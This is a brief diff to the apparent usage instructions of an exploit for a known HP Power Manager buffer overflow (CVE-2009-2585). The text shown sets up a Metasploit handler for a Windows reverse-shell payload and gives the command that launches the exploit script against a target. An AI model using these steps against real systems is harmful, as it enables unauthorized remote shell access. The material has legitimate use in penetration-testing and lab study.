@@ -11,4 +11,6 @@ Or using the metasploit module:
 
 <pre> /exploit/multi/handler with payload: windows/shell_reverse_tcp </pre>
 
-python CVE2009-2585_HP_Power_Manager_BoF <<TARGET>>
+Now, you can launch the exploit:
+
+<pre>python CVE2009-2585_HP_Power_Manager_BoF <TARGET> </pre>
